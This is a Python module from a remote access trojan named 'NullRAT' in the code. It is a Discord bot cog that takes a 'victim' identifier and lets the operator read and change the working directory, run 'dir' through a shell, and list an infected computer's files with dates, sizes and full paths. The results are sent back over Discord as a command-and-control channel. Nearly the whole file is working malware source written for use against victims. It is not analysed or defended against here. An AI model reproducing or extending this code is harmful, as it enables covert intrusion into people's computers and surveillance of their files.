import disnake as discord
from disnake.ext import commands
from datetime import datetime
from io import BytesIO

import os, requests, time
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class DirectoryCommands(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def get_currentdir(self, ctx, victim):
        """Returns Current Working Directory

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "Current directory of NullRAT:", 
                    datetime.now(), 
                    f"```{os.getcwd()}```"
                )
            )

    @commands.slash_command( )
    async def set_currentdir(self, ctx, victim, directory):
        """Change directory to specified location

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        directory: Directory where NullRAT will change (cd) to
        """
        if str(victim) == str(self.bot.identifier):
            try:
                os.chdir(directory)
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Successfully changed directory", 
                        datetime.now(), 
                        f"New directory:\n```{os.getcwd()}```"
                    )
                )
            except FileNotFoundError:
                await ctx.response.send_message(embed=self.bot.genEmbed( "Directory not found!", datetime.now() ))

    @commands.slash_command( )
    async def list_rawdir(self, ctx, victim, directory="null"):
        """List all directory contents quickly in a raw format
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        directory: Directory whose contents will be listed (optional)
        """
        if str(victim) == str(self.bot.identifier):
            if directory != 'null':
                try: os.chdir(directory)
                except FileNotFoundError: return await ctx.response.send_message("Invalid directory!")

            await ctx.response.send_message(
                file=discord.File(
                    BytesIO(bytes(os.popen("dir").read(), 'utf-8')),
                    filename="Directory.txt",
                )
            )
            
    @commands.slash_command( )
    async def list_directory(self, ctx, victim, directory="null"):
        """Lists contents of directory with advanced information

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        directory: Directory whose contents will be listed (optional)
        """
        if str(victim) != str(self.bot.identifier):
            return
        try:
            contents = os.listdir( 
                os.getcwd() if directory == "null" else directory 
            )
        except FileNotFoundError:
            return await ctx.response.send_message(
                embed = self.bot.genEmbed(
                    "Invalid directory!",
                    datetime.now()
                )
            )

        try: os.chdir(directory)
        except: pass

        await ctx.response.send_message(
            embed = self.bot.genEmbed(
                "Directory Contents:",
                datetime.now()
            )
        )

        embeds = []

        for c in contents:
            embed = self.bot.genEmbed(f"**{c}**",datetime.now(),'_ _')

            embed.add_field(
                name = "Type:", 
                value = "Directory" if os.path.isdir(c) else "File", 
                inline = False
            )

            try:    
                embed.add_field(
                    name = "Created on:", 
                    value = str(
                        time.ctime(
                            os.path.getctime(c)
                        )
                    ), inline = False
                )

                embed.add_field(
                    name = "Last modified:", 
                    value = str(
                        time.ctime(
                            os.path.getmtime(c)
                        )
                    ), inline = False
                )
            except FileNotFoundError:
                pass

            try:
                if os.path.isdir(c) == False:
                    embed.add_field(
                        name = "File Size:",
                        value = convert_bytes(os.path.getsize(c)),
                        inline = False
                    )
                else:
                    embed.add_field(
                        name = "File Size:",
                        value = 'N/A',
                        inline = False
                    )
            except:
                pass

            embed.add_field(
                name="Absolute Path:",
                value=f"```{os.path.abspath(c)}```",
                inline=False,
            )

            embeds.append(embed)

        await ctx.channel.send(embed = embeds[0], view = Menu(embeds))

def convert_bytes(size):
    """ Convert bytes to KB, or MB or GB"""
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return "%3.1f %s" % (size, x)
        size /= 1024.0
        
def setup(bot: commands.Bot):
    bot.add_cog(DirectoryCommands(bot))

class Menu(discord.ui.View):
    def __init__(self, embeds):
        super().__init__(timeout=None)
        self.embeds = embeds
        self.embed_count = 0

        self.first_page.disabled = True
        self.prev_page.disabled = True

        for i, embed in enumerate(self.embeds):
            embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)}")

    @discord.ui.button(label="<< First", style=discord.ButtonStyle.blurple)
    async def first_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count = 0
        embed = self.embeds[self.embed_count]
        embed.set_footer(text=f"Page 1 of {len(self.embeds)}")

        self.first_page.disabled = True
        self.prev_page.disabled = True
        self.next_page.disabled = False
        self.last_page.disabled = False
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="< Previous", style=discord.ButtonStyle.secondary)
    async def prev_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count -= 1
        embed = self.embeds[self.embed_count]

        self.next_page.disabled = False
        self.last_page.disabled = False
        if self.embed_count == 0:
            self.first_page.disabled = True
            self.prev_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Next >", style=discord.ButtonStyle.secondary)
    async def next_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count += 1
        embed = self.embeds[self.embed_count]

        self.first_page.disabled = False
        self.prev_page.disabled = False
        if self.embed_count == len(self.embeds) - 1:
            self.next_page.disabled = True
            self.last_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Last >>", style=discord.ButtonStyle.blurple)
    async def last_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count = len(self.embeds) - 1
        embed = self.embeds[self.embed_count]

        self.first_page.disabled = False
        self.prev_page.disabled = False
        self.next_page.disabled = True
        self.last_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)